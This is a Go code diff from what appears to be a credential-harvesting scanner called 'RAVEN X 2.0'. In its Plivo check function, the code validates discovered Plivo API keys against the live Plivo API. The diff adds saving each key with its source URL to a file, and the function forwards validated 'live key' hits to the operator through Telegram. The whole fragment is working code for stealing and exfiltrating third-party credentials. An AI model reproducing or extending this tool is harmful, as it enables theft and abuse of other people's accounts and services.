@@ -23,6 +23,8 @@ func (a *AWSScanner) CheckPlivo(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "plivo_found.txt")
+
 	url := "https://api.plivo.com/v1/Account/" + key + "/"
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
@@ -60,14 +62,8 @@ func (a *AWSScanner) CheckPlivo(key, sourceURL string) bool {
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📞 <b>PLIVO LIVE KEY</b>
-
-🔑 <b>Auth ID:</b> <code>%s</code>
-👤 <b>Account:</b> %s
-🔗 <b>Source:</b> %s
-`, key, info, sourceURL)
+	msg := a.tgHit("📞", "PLIVO", sourceURL) + fmt.Sprintf(
+		"\n🔑 <b>Auth ID:</b> <code>%s</code>\n👤 <b>Account:</b> %s\n", key, info)
 	go a.sendTelegram(msg)
 	return true
 }
